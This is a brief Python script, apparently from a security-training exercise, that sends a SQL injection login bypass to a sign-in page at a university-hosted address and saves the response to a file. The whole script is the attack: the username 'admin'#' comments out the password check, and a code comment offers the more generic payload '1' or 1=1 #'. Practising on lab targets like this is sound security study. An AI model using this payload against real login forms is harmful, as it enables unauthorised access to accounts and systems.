import requests

targetUrl = "http://shepherd.ii.uib.no:8001/signIn"
param = {"inputName":"admin'#", "inputPassword":"not_needed"}
#also we can use 1' or 1=1 # in the input name that is more generic

result = requests.post(targetUrl, param)

f = open("out_1.txt", "w")

f.write(result.text)
